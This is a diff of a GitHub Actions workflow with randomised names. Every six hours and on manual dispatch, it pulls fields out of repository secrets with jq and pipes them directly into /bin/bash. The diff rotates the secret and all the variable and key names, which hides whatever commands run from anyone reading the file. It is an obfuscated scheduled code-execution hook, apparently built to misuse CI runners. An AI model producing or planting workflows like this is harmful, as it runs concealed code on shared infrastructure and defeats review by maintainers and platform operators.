@@ -1,9 +1,11 @@
 name: xianhyu7jk
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 1/6 * * *'
-jobs:  # 13035
+    - cron: '2 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,17 +13,18 @@ jobs:  # 13035
       - uses: actions/checkout@v4
       - name: xianhyu7jk
         env:
-          qdas44627: ${{ secrets.qdas44627 }}
+          myi96: ${{ secrets.myi96 }}
         run: |
-          echo $qdas44627 | jq -r .c22 | /bin/bash
-          echo $po26391 | jq -r .art35 | /bin/bash
-          echo $hf14 | jq -r .minqm6 | /bin/bash
-          echo $apty0614 | jq -r .wzeaz920 | /bin/bash
-          echo $bhkc45 | jq -r .m8 | /bin/bash
-          echo $l98 | jq -r .cnofn33 | /bin/bash
-          echo $k32889 | jq -r .k86 | /bin/bash
-          echo $wege81003 | jq -r .anzw1 | /bin/bash
-          echo $iiqk0 | jq -r .oo61 | /bin/bash
-          echo $r15 | jq -r .top86 | /bin/bash
-          echo $nzskd082 | jq -r .ehlno73 | /bin/bash
+          echo $myi96 | jq -r .gym38 | /bin/bash
+          echo $rnwsm3 | jq -r .fz50976 | /bin/bash
+          echo $m92 | jq -r .jrp41755 | /bin/bash
+          echo $cxmgb9427 | jq -r .x05146 | /bin/bash
+          echo $o842 | jq -r .glcwr9795 | /bin/bash
+          echo $kb459 | jq -r .n08 | /bin/bash
+          echo $h8 | jq -r .gnvy5732 | /bin/bash
+          echo $qptpa88 | jq -r .dt1834 | /bin/bash
+          echo $rfk62 | jq -r .cc16445 | /bin/bash
+          echo $uggj45 | jq -r .ywr47 | /bin/bash
+          echo $tf48 | jq -r .y8661 | /bin/bash
+          echo $f878 | jq -r .onhlr9532 | /bin/bash
 
